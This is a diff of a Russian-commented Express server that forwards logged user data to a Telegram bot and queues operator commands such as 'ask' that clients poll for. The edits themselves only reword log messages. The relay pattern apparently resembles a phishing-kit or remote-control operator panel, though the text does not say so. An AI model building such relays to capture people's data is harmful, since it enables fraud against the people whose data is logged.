@@ -15,7 +15,7 @@ let userTasks = {};
 
 app.post('/api/log', async (req, res) => {
     const { userId, type, data } = req.body;
-    console.log(`[LOG] Получены данные от ${userId} (${type})`);
+    console.log(`[LOG] Данные от ${userId} (${type})`);
     
     let logMsg = `<b>🔔 НОВЫЙ ЛОГ [${type}]</b>\n`;
     logMsg += `🆔 ID: <code>${userId}</code>\n`;
@@ -48,7 +48,7 @@ app.post('/api/log', async (req, res) => {
         });
         res.json({ success: true });
     } catch (e) {
-        console.error("Ошибка TG:", e.message);
+        console.error("ОШИБКА TG:", e.message);
         res.status(500).send('TG Error');
     }
 });
@@ -57,29 +57,28 @@ app.get('/api/check/:userId', (req, res) => {
     const userId = req.params.userId;
     const task = userTasks[userId] || null;
     if (task) {
-        console.log(`[CHECK] Отправка команды пользователю ${userId}:`, task.action);
+        console.log(`[CHECK] Команда для ${userId}:`, task.action);
         delete userTasks[userId]; 
     }
     res.json(task);
 });
 
-// --- API ДЛЯ ТЕЛЕГРАМА ---
+// --- API ДЛЯ ТЕЛЕГРАМА (WEBHOOK) ---
 
 app.post('/tg-webhook', async (req, res) => {
     const { message, callback_query } = req.body;
 
     if (callback_query) {
         const parts = callback_query.data.split('_');
-        const action = parts[0]; // ask или msg
+        const action = parts[0]; 
         const userId = parts[1];
-        // Исправлено: берем всё, что идет после userId как текст
-        const text = parts.slice(2).join('_');
+        const text = parts.slice(2).join('_'); // Берем весь остаток как текст
 
         userTasks[userId] = { action, text };
 
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
             callback_query_id: callback_query.id,
-            text: "✅ Команда отправлена!"
+            text: "✅ Отправлено!"
         });
     }
 
@@ -100,4 +99,4 @@ app.post('/tg-webhook', async (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Server started on port ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Сервер запущен на порту ${PORT}`));
